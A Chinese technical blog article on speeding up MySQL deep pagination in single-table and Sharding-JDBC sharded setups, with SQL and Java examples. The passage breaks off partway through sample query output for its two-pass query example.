        <content type="html"><![CDATA[<p>遇到mysql 深度翻页这个问题，该如何才能回答得很漂亮，才能 让面试官刮目相看、口水直流。</p><h2 id="本文目录"><a href="#本文目录" class="headerlink" title="本文目录"></a>本文目录</h2><p><strong><strong>-</strong></strong> <strong>单表场景，limit深度分页存在的严重性能问题</strong></p><h5 id="问题-为什么-mysql-深度分页会很慢？"><a href="#问题-为什么-mysql-深度分页会很慢？" class="headerlink" title="-问题: 为什么 mysql 深度分页会很慢？"></a>-问题: 为什么 mysql 深度分页会很慢？</h5><p>- limit在深度翻页场景下变成了： 全表扫描+ 文件排序 filesort </p><p><strong><strong>-</strong></strong> <strong>单表场景 limit 深度分页 的优化方法</strong></p><h5 id="1）子查询分页方式"><a href="#1）子查询分页方式" class="headerlink" title="-1）子查询分页方式"></a>-1）子查询分页方式</h5><h5 id="2）join-分页方式"><a href="#2）join-分页方式" class="headerlink" title="-2）join 分页方式"></a>-2）join 分页方式</h5><p><strong><strong>-</strong></strong> <strong>索引覆盖（Cover Index）</strong></p><p><strong><strong>-</strong></strong> <strong>单表场景 limit 深度分页  总结</strong></p><p><strong><strong>-</strong> 分表场景，limit深度分页存在的严重性能问题</strong></p><h5 id="分表场景下-功能和性能的冲突：从0开始的性能瓶颈"><a href="#分表场景下-功能和性能的冲突：从0开始的性能瓶颈" class="headerlink" title="-分表场景下 功能和性能的冲突：从0开始的性能瓶颈"></a>-分表场景下 功能和性能的冲突：从0开始的性能瓶颈</h5><p>- Sharding-JDBC的性能优化措施</p><p>- 当然，流式查询的也是有弊端的</p><p>- 分表场景+大表场景，limit严重性能问题 如何解决？</p><p>- 优化方案1： 禁止跳页查询法</p><p>- 优化方法2：二次查询法</p><h5 id="二次查询法的一个例子"><a href="#二次查询法的一个例子" class="headerlink" title="-二次查询法的一个例子"></a>-二次查询法的一个例子</h5><p>- 优化方案3：使用 ES+HBASE 海量NOSQL架构方案</p><p><strong><strong>-</strong></strong> <strong>说在最后：有问题找老架构取经</strong></p><h1 id="单表场景，limit深度分页存在的严重性能问题"><a href="#单表场景，limit深度分页存在的严重性能问题" class="headerlink" title="单表场景，limit深度分页存在的严重性能问题"></a>单表场景，limit深度分页存在的严重性能问题</h1><p>大家的业务接口，常常是分页接口，这样的接口，如果碰到深度分页，都会有慢sql性能问题。</p><p>一个小伙伴反馈，他们公司今年3月份时候，线上发生一次大事故。主要后端服务器发生宕机，所有接口超时。宕机半小时后，又自动恢复正常。但是过了2小时，又再次发生宕机。</p><p>通过接口日志定位，发现MySQL数据库无法响应服务器。</p><p>被刷到7000多页，偏移量（<code>offset</code>）高达20w多。</p><p>每当这条SQL执行时，数据库CPU直接打满。</p><p>查询时间超过1分钟才有响应。</p><p>由于慢查询导致数据库CPU使用率爆满，其他业务的数据库请求无法得到及时响应，接口超时。最后，拖垮主服务器。</p><p>所以说，limit深度分页存在的严重性能问题。</p><p>MySQL Limit 语法格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT \* FROM table LIMIT \[offset,\] rows | rows OFFSET offset  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分页查询时，我们会在 <code>LIMIT</code> 后面传两个参数，一个是偏移量（<code>offset</code>），一个是获取的条数（<code>limit</code>）。</p><p>当偏移量很小时，查询速度很快，但是当 <code>offset</code> 很大时，查询速度就会变慢。</p><p>假设有一张 300w 条数据的表，对其进行分页查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 1, 10  // 32.8ms  </span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 10, 10 // 34.2ms  </span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 100, 10 // 35.4ms  </span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 1000, 10 // 39.6ms  </span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 10000, 10 // 5660ms  </span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 100000, 10 // 61.4 秒  </span><br><span class="line">select \* from user where sex = &#x27;m&#x27; order by age limit 1000000, 10 // 273 秒  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，随着偏移量（<code>offset</code>）的增加，查询时间变得越长。</p><p>上例中，当偏移的起始位置超过10万时，分页查询的时间超过61秒。</p><p>当偏移量超过100万时，查询时间竟然长达273秒。</p><p>对于普通的业务而言，超过1秒的查询是绝对不可以忍受的。</p><p>从上例中，我们可以总结出：LIMIT分页查询的时间与偏移量值成正比。</p><p>当偏移量越大时，查询时间越长。</p><p>这种情况，会随着业务的增加，数据的增多，会越发的明显。那么，如何优化这种情况呢？答案是，索引覆盖。</p><h3 id="问题-为什么-mysql-深度分页会很慢？-1"><a href="#问题-为什么-mysql-深度分页会很慢？-1" class="headerlink" title="问题: 为什么 mysql 深度分页会很慢？"></a>问题: 为什么 mysql 深度分页会很慢？</h3><p>包括两层，server层和存储引擎层</p><p>server层：查询缓存，解析sql语句生成语法树，执行sql。在执行sql中包括预处理器，优化器和执行器。</p><ul><li><p>预处理器：将查询字段展开（如select * 展开为具体字段）并检查字段是否合法</p></li><li><p>优化器：指定sql执行计划，如选择合适的索引</p></li><li><p>执行器：与存储引擎层交互，执行sql语句</p></li></ul><p>存储引擎层 Engine层：如InnoDB和MyISAM。以InnoDB为例，访问B+树数据结构获取记录（聚簇索引，二级索引等的访问都在存储引擎层）</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/1.png"></p><h2 id="limit在深度翻页场景下变成了：-全表扫描-文件排序-filesort"><a href="#limit在深度翻页场景下变成了：-全表扫描-文件排序-filesort" class="headerlink" title="limit在深度翻页场景下变成了： 全表扫描+ 文件排序 filesort"></a>limit在深度翻页场景下变成了： 全表扫描+ 文件排序 filesort</h2><p>limit 是执行在server 层，而不是innodb层。</p><p>也就是说， 在server层 需要获取到 全部的 limit_cout 的结果，在发送给客户端时，才会进行limit操作。</p><p>比如如下sql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 1000000, 10 // 273 秒  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>server 层 在执行器调存储引擎api获取到一条数据时，会查看数据是否是第1000000 以后条数据，如果不是，就不会发送到客户端，只进行limit_cout 计数。</p><p>server 层 直到10001才会发送到客户端。也就是说，执行 limit m n语句的场景下， Engine层 实际上也会访问前m条数据，然后返回后n条数据。</p><p>正是因为 Engine层 limit会扫描每条记录，因此如果我们查询的字段需要回表扫描，每一次查询都会拿着age列的二级索引查到的主键值去回表，limit 1000000 就会回表1000000 次，效率极低。</p><p>所以如果我们使用explain查看查询计划：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">explain select \* from user  where sex = &#x27;m&#x27; order by age  limit 1000000, 10  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其往往不会走age索引，而是全表扫描+filesort，为什么？ 因为优化器认为选择age索引的效率，甚至不如全表扫描+文件排序filesort。</p><p>所以，当翻页靠后时，查询会变得很慢，因为随着偏移量的增加，我们需要排序和扫描的非目标行数据也会越来越多，这些数据再扫描后都会被丢弃。</p><h1 id="单表场景-limit-深度分页-的优化方法"><a href="#单表场景-limit-深度分页-的优化方法" class="headerlink" title="单表场景 limit 深度分页 的优化方法"></a>单表场景 limit 深度分页 的优化方法</h1><p>对于LIMIT分页查询的性能优化，主要思路是利用  索引覆盖 字段定位数据，然后再取出内容。</p><p>不使用索引覆盖，查询耗时情况：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT \* FROM \`tbl\_works\`  WHERE \`status\`\=1   LIMIT 100000, 10  // 78.3 秒  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1）子查询分页方式-1"><a href="#1）子查询分页方式-1" class="headerlink" title="1）子查询分页方式"></a>1）子查询分页方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT \* FROM tbl\_works  </span><br><span class="line">WHERE id &gt;= (SELECT id FROM tbl\_works limit 100000, 1)  </span><br><span class="line">LIMIT 20  // 54ms  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>子查询分页方式，首先通过子查询和索引覆盖定位到起始位置ID，然后再取所需条数的数据。</p><p>缺点是，不适用于结果集不以ID连续自增的分页场景。</p><p>在复杂分页场景，往往需要通过过滤条件，筛选到符合条件的ID，此时的ID是离散且不连续的。</p><p>如果使用上述的方式，并不能筛选出目标数据。</p><p>当然，我们也可以对此方法做一些改进，首先利用子查询获取目标分页的 <code>ids</code>，然后再根据 <code>ids</code> 获取内容。 根据直觉将SQL改造如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT \* FROM tbl\_works  </span><br><span class="line">WHERE id IN (SELECT id FROM tbl\_works limit 100000, 10)  </span><br><span class="line">  </span><br><span class="line">// 错误信息：  </span><br><span class="line">// This version of MySQL doesn&#x27;t yet support &#x27;LIMIT &amp; IN/ALL/ANY/SOME subquery&#x27;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然而，并不尽人意。我们得到一个错误提示。 错误信息的含义是，子查询不能有 <code>limit</code>操作。于是，我们对SQL进行了改造，对子查询包了一层：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT t1.\* FROM tbl\_works t1  </span><br><span class="line">WHERE t1.id in (SELECT t2.id from (SELECT id FROM tbl\_works limit 100000, 10) as t2)  // 53.9ms  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行成功，且查询效率很高。</p><p>但是，这种写法非常繁琐。</p><p>我们可以使用下面的 <code>join</code> 分页方式，达到相同的优化效果。实际上，两者的原理是相同的。</p><h3 id="2）join-分页方式-1"><a href="#2）join-分页方式-1" class="headerlink" title="2）join 分页方式"></a>2）join 分页方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT \* FROM tbl\_works t1   </span><br><span class="line">JOIN (SELECT id from tbl\_works WHERE status=1  limit 100000, 10) t2  </span><br><span class="line">ON t1.id = t2.id  // 53.6 ms  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这条SQL的含义是，通过自连接与<code>join</code>定位到目标 <code>ids</code>，然后再将数据取出。</p><p>在定位目标 <code>ids</code>时，由于 <code>SELECT</code>的元素只有主键 <code>ID</code>，且<code>status</code> 存在索引，因此MySQL只需在索引中，就能定位到目标 <code>ids</code>，不用在数据文件上进行查找。</p><p>因而，查询效率非常高。</p><h1 id="基础知识：什么是-索引覆盖（Cover-Index）"><a href="#基础知识：什么是-索引覆盖（Cover-Index）" class="headerlink" title="基础知识：什么是  索引覆盖（Cover Index）"></a>基础知识：什么是  索引覆盖（Cover Index）</h1><blockquote><p>如果索引包含所有满足查询需要的数据的索引，成为索引覆盖(Covering Index)，也就是平时所说的不需要回表操作。</p></blockquote><p><strong>索引覆盖（Index Covering）</strong>是指<strong>一个查询可以完全通过索引来执行，而无需访问实际的数据行</strong>。</p><p>在数据库中，通常查询语句包含了一系列的条件，这些条件用于筛选出符合特定条件的数据行。</p><p>如果这些条件能够通过索引直接定位到符合条件的数据行，而无需访问实际的数据页，那么就称为索引覆盖。</p><p>比如我们有这样一条SQL语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">select name,age,level from user where name = &quot;AAA&quot; and age  17  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么，我们添加一个联合索引，覆盖所有的查询内容, 联合索引如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">key \`idx\_nal\` (\`name\`,\`age\`,\`level\`) using btree  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有了这个联合索引，我们在搜索的时候，只需要通过索引就能够拿到我们需要的全部数据了。</p><p>简单的说，索引覆盖覆盖所有需要查询的字段（即，大于或等于所查询的字段）。MySQL可以通过索引获取查询数据， 这样就避免了回表，不需要读取数据行。</p><p>索引覆盖注意事项：</p><p>1.如果一个索引<strong>包含了需要查询的所有字段</strong>，那么这个索引就是覆盖索引。</p><p>2.MySQL <strong>只能使用B+Tree</strong>索引做覆盖索引，因为只有B+树能存储索引列值</p><p>索引覆盖的好处：</p><ol><li><p>索引大小远小于数据行大小。因而，如果只读取索引，则能极大减少对数据访问量。</p></li><li><p>索引按顺序储存。对于IO密集型的范围查询会比随机从磁盘读取每一行数据的IO要少。</p></li><li><p>避免对主键索引的二次查询。二级索引的叶子节点包含了主键的值，如果二级索引包含所要查询的值，则能避免二次查询主键索引（聚簇索引，聚簇索引既存储了索引，也储存了值）。</p></li></ol><h1 id="单表场景-limit-深度分页-总结"><a href="#单表场景-limit-深度分页-总结" class="headerlink" title="单表场景 limit 深度分页 总结"></a>单表场景 limit 深度分页 总结</h1><p>通过利用索引覆盖，能极大的优化了Limit分页查询的效率。</p><p>在真正的实践中，除了使用索引覆盖，优化查询速度外，我们还可以使用 Redis 缓存，将热点数据进行缓存储存。</p><p>背景描述的事故，我们考虑了时间成本和业务复杂度后，最后采取的是限制分页和增加缓存。</p><p>所谓的限制分页，即在不影响阅读体验的前提下，只允许用户可以查看前几千条的数据。</p><p>经测验，偏移量较小时的查询效率较令人满意，查询效率接近使用索引覆盖查询的速度。</p><h1 id="分表场景，limit深度分页存在的严重性能问题"><a href="#分表场景，limit深度分页存在的严重性能问题" class="headerlink" title="分表场景，limit深度分页存在的严重性能问题"></a>分表场景，limit深度分页存在的严重性能问题</h1><p>大家知道 ，当一个表（比如订单表） 达到500万条或2GB时，需要考虑水平分表。</p><p>比如大型的电商系统中的订单服务，业务量很少时，单库单表基本扛得住，但是随着时间推移，数据量越来越多，订单服务在读写的性能上逐渐变差。</p><p>这里也介绍是，是Sharding-JDBC 的 limit深度分页 执行逻辑和性能问题。</p><p>Sharding-JDBC从多个分表获取分页数据，与单表分页的执行逻辑，本质是不同的。</p><p>分表分页场景下的 分页逻辑， 并不是： 简单的去 每个分表取到同样的数量的数据， 简单归并+挑选 。</p><p>分表分页场景下的 分页逻辑，要从 0开始去每一个分表 获取到 limit 全部的数据， 而不是从offset 开始。</p><p>如果是深度分页， 比如说：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">select \* from user  where sex = &#x27;m&#x27; order by age  limit 1000000, 10 // 273 秒  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么要去每一个 分表 获取到 limit 全部的1000000 + 10 条 数据 ， 会导致每一个分表都走 全表扫描+ 文件排序 filesort ， 每一个分表的性能都很低。</p><p>当然，在这里带大家首先要解决的问题是： 为什么 表分页场景下的 分页逻辑，要从 0开始去每一个分表 获取到 limit 全部的数据， 而不是从offset 开始。</p><p>假设每10条数据为一页，取第2页数据。 </p><p>在分片环境下获取LIMIT 10, 10，归并之后再根据排序条件取出前10条数据是不正确的。</p><p>举例说明，若SQL为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT score FROM t\_score ORDER BY score DESC LIMIT 1, 2;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下图展示了不进行SQL的改写的分页执行结果：</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/2.png"></p><p>通过图中所示，想要取得两个表中共同的按照分数排序的第2条和第3条数据，理论上，应该是95和90。</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/3.png"></p><p>实际上呢？</p><p>由于执行的SQL只能从每个表中获取第2条和第3条数据，即:</p><ul><li><p>从t_score_0表中获取的是90和80；</p></li><li><p>从t_score_0表中获取的是85和75。</p></li></ul><p>因此进行结果归并时，只能从获取的90，80，85和75之中进行归并，那么，无论怎么实现，结果归并之后，都不可能获得正确的结果。</p><p>正确的做法:</p><p>是将分页条件改写为LIMIT 0, 3，取出所有前两页数据，再结合排序条件计算出正确的数据。</p><p>下图展示了进行SQL改写之后的分页执行结果。</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/4.png"></p><p>回到问题： 为什么 表分页场景下的 分页逻辑，要从 0开始去每一个分表 获取到 limit 全部的数据， 而不是从offset 开始。</p><p>答案是： 为了合并之后的结果不出错，每一个分表的查询是必须0开始， 归并之后的结果才不会错。</p><h3 id="分表场景下-功能和性能的冲突：从0开始的性能瓶颈-1"><a href="#分表场景下-功能和性能的冲突：从0开始的性能瓶颈-1" class="headerlink" title="分表场景下 功能和性能的冲突：从0开始的性能瓶颈"></a>分表场景下 功能和性能的冲突：从0开始的性能瓶颈</h3><p>注意，这里有个大问题：</p><p>为了结果不出错，归并之前的查询，是0开始， 结果才可能是对的。</p><p>所以，询偏移量过大的分页会导致数据库获取数据性能低下，<br><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/5.png"></p><p>如果不是分库分表，这句SQL会使得MySQL在无法利用索引的情况下跳过1000000条记录后，再获取10条记录，其性能可想而知。</p><p>然而， 在分库分表的情况下（假设分为2个库），为了保证数据的正确性，SQL会改写为：</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/6.png"></p><p>所以， 分库分表场景， Sharding-JDBC 需要将偏移量前的记录全部取出，归并排序后，挑选最后10条记录。</p><p>这会在数据库本身就执行很慢的情况下，进一步加剧性能瓶颈。</p><p>因为原SQL仅需要传输10条记录至客户端，而改写之后的SQL则会传输1,000,010 * 2的记录至客户端。</p><h2 id="Sharding-JDBC的性能优化措施"><a href="#Sharding-JDBC的性能优化措施" class="headerlink" title="Sharding-JDBC的性能优化措施"></a>Sharding-JDBC的性能优化措施</h2><p>那么，Sharding-JDBC会将全量的记录（如1,000,010 * 2 记录） 都全部加载至内存吗？</p><p>不会，这样加载，会占用大量内存而导致内存溢出。</p><p>Sharding-JDBC 知道了问题所在，本身也会做优化。</p><p>Sharding-JDBC的性能优化措施，主要如下：</p><p>（1）<strong>采用流式处理 + 归并排序的方式来避免内存的过量占用。</strong></p><p>由于SQL改写不可避免的占用了额外的带宽，但并不会导致内存暴涨。</p><p>与直觉不同，大多数人认为Sharding-JDBC会将1,000,010 * 2记录全部加载至内存，进而占用大量内存而导致内存溢出。</p><p>但由于每个结果集的记录是有序的，因此Sharding-JDBC每次仅获取各个分片的当前结果集记录，驻留在内存中的记录仅为当前路由到的分片的结果集的当前游标指向而已。</p><p><strong>对于本身即有序的待排序对象，归并排序的时间复杂度仅为O(n)，性能损耗很小。</strong></p><p>（2）<strong>Sharding-JDBC对仅落至多分片的查询进行进一步优化。</strong></p><p>落至单分片查询的请求并不需要改写SQL也可以保证记录的正确性，因此在此种情况下，Sharding-JDBC并未进行SQL改写，从而达到节省带宽的目的。</p><p>一般情况下，性能慢，都是第一种情况。</p><h2 id="当然，流式查询的也是有弊端的"><a href="#当然，流式查询的也是有弊端的" class="headerlink" title="当然，流式查询的也是有弊端的"></a>当然，流式查询的也是有弊端的</h2><p>采用游标查询的方式的缺点很明显。</p><p><em>流式（游标）查询需要注意：当前查询会独占连接！</em></p><p><em>必须先读取（或关闭）结果集中的所有行，然后才能对连接发出任何其他查询，否则将引发异常！</em></p><p>执行一个流式查询后，数据库访问框架就不负责关闭数据库连接了，需要应用在取完数据后需要自己关闭。</p><p>由于MySQL_Server不知道客户端什么时候将数据消费完，而自身的对应表可能会有DML写入操作，<strong>此时MySQL_Server需要建立一个临时空间来存放需要拿走的数据</strong>。</p><p>因此对于当你启用useCursorFetch 读取 大表的时候，会看到MySQL上的几个现象：</p><ol><li><p>IOPS 飙升，因为需要返回的数据需要写入到临时空间中，存在大量的 IO 读取和写入，此流程可能会引起其它业务的写入抖动</p></li><li><p>磁盘空间飙升，写入临时空间的数据会在读取完成或客户端发起 <strong>ResultSet#close</strong> 操作时由 MySQL_Server 回收</p></li><li><p>客户端 JDBC 发起sql_query，可能会有长时间等待，这段时间为MySQL_Server准备数据阶段。</p><p>但是 普通查询等待时间与游标查询等待时间原理上是不一致的: 前者是在读取网络缓冲区的数据，没有响应到业务层面；后者是 MySQL 在准备临时数据空间，没有响应到 JDBC</p></li><li><p>数据准备完成后，进行到传输数据阶段，网络响应开始飙升，IOPS 由”写”转变为”读”</p></li></ol><h2 id="分表场景-大表场景，limit严重性能问题-如何解决？"><a href="#分表场景-大表场景，limit严重性能问题-如何解决？" class="headerlink" title="分表场景+大表场景，limit严重性能问题 如何解决？"></a>分表场景+大表场景，limit严重性能问题 如何解决？</h2><p>虽然有流式查询，但是分表场景+大表场景，limit深度翻页还是存在的严重性能问题 ，基本上是分页越大后续的查询越耗资源并且越慢，如何解决呢？</p><h2 id="优化方案1：-禁止跳页查询法"><a href="#优化方案1：-禁止跳页查询法" class="headerlink" title="优化方案1： 禁止跳页查询法"></a>优化方案1： 禁止跳页查询法</h2><p>由于LIMIT并不能通过索引查询数据，</p><p><strong>因此如果可以保证ID的连续性，通过ID进行分页是比较好的解决方案</strong>：</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/7.png"></p><p>或者：通过记录上次查询结果的最后一条记录的ID，进行下一页的查询：</p><p><img src="/./2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/8.png"></p><p>如果不是id列， 假设排序的列为col，禁止跳页查询法的两个步骤大致如下：</p><p>（1）用正常的方法取得第一页数据，并得到第一页记录的 max_col 最大值；</p><p>（2）每次翻页，将 order by col offset X limit Y; 改写成 下面的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">order by col  where col&gt;$max\_col  limit Y;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以保证每次只返回一页数据，性能为常量。</p><h2 id="优化方法2：二次查询法"><a href="#优化方法2：二次查询法" class="headerlink" title="优化方法2：二次查询法"></a>优化方法2：二次查询法</h2><p>假设排序的列为col，二次查询法的两个步骤大致如下：</p><p>（1）分页偏移量平均 offset&#x2F;N(分片数) ，将 order by col offset X limit Y; 改写成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">order by col  offset X/N limit Y;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（2）多页返回，找到最小值col_min 和 最大 值 col_max；</p><p>（3）between二次查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">order by col between  col\_min and col\_i\_max;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（4）设置虚拟col_min，找到col_min在各个分表的offset，从而得到col_min在全局的offset；</p><p>（5）得到了col_min在全局的offset，自然得到了全局的offset X limit Y；</p><h3 id="二次查询法的一个例子-1"><a href="#二次查询法的一个例子-1" class="headerlink" title="二次查询法的一个例子"></a>二次查询法的一个例子</h3><p>例子：分表结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">CREATE TABLE \`student\_time\_0\` (  </span><br><span class="line">  \`id\` int(11) unsigned NOT NULL AUTO\_INCREMENT,  </span><br><span class="line">  \`user\_id\` int(11) NOT NULL,  </span><br><span class="line">  \`name\` varchar(200) COLLATE utf8\_bin DEFAULT NULL,  </span><br><span class="line">  \`age\` tinyint(3) unsigned DEFAULT NULL,  </span><br><span class="line">  \`create\_time\` bigint(20) DEFAULT NULL,  </span><br><span class="line">  PRIMARY KEY (\`id\`)  </span><br><span class="line">) ENGINE\=InnoDB AUTO\_INCREMENT=674 DEFAULT CHARSET\=utf8 COLLATE\=utf8\_bin;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有这样的三个表</p><ul><li><p><code>student_time_0</code>,</p></li><li><p><code>student_time_1</code>,</p></li><li><p><code>student_time_2</code>,</p></li></ul><p>以 user_id 作为分表键，根据表数量取模作为分表依据</p><p>这里先构造点数据，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">insert into student\_time (\`name\`, \`user\_id\`, \`age\`, \`create\_time\`) values (?, ?, ?, ?)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要是为了保证 <code>create_time</code> 唯一，比较好说明问题，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">int i = 0;  </span><br><span class="line">try (  </span><br><span class="line">        Connection conn = dataSource.getConnection();  </span><br><span class="line">        PreparedStatement ps = conn.prepareStatement(insertSql)) &#123;  </span><br><span class="line">    do &#123;  </span><br><span class="line">        ps.setString(1, localName + new Random().nextInt(100));  </span><br><span class="line">        ps.setLong(2, 10086L + (new Random().nextInt(100)));  </span><br><span class="line">        ps.setInt(3, 18);  </span><br><span class="line">        ps.setLong(4, new Date().getTime());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        int result = ps.executeUpdate();  </span><br><span class="line">        LOGGER.info(&quot;current execute result: &#123;&#125;&quot;, result);  </span><br><span class="line">        Thread.sleep(new Random().nextInt(100));  </span><br><span class="line">        i++;  </span><br><span class="line">    &#125; while (i &lt;= 2000);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三个表的数据分别是 673，678，650，各个表数据不一样，</p><p>接下来，做一个这样的分页查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">select \* from student\_time ORDER BY create\_time ASC limit 1000, 5;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>student_time</code> 对于我们使用的 <code>sharding-jdbc</code> 来说当然是逻辑表， sharding-jdbc 会改写为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">select \* from student\_time ORDER BY create\_time ASC limit 0, 1005;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即使如 sharding-jdbc 对于合并排序的优化做得比较好，也还是需要传输那么大量的数据，并且查询也耗时，那么有没有解决方案呢</p><ul><li><p>第一个办法禁止跳页，而是只给下一页，那么我们就能把前一次的最大偏移量的 create_time 记录下来，下一页就可以拿着这个偏移量进行查询</p></li><li><p>第二个办法是二次查询法</p></li></ul><p>这个办法的第一步跟前面那个错误的方法或者说不准确的方法一样，先是将分页偏移量平均 1000&#x2F;3 &#x3D; 333，根据这个 limit 333,5 在三个表里进行查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">t0  </span><br><span class="line">334 10158 nick95  18  1641548941767  </span><br><span class="line">335 10098 nick11  18  1641548941879  </span><br><span class="line">336 10167 nick51  18  1641548942089  </span><br><span class="line">337 10167 nick3 18  1641548942119  </span><br><span class="line">338 10170 nick57  18  1641548942169  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">t1  </span><br><span class="line">334 10105 nick98  18  1641548939071   最小  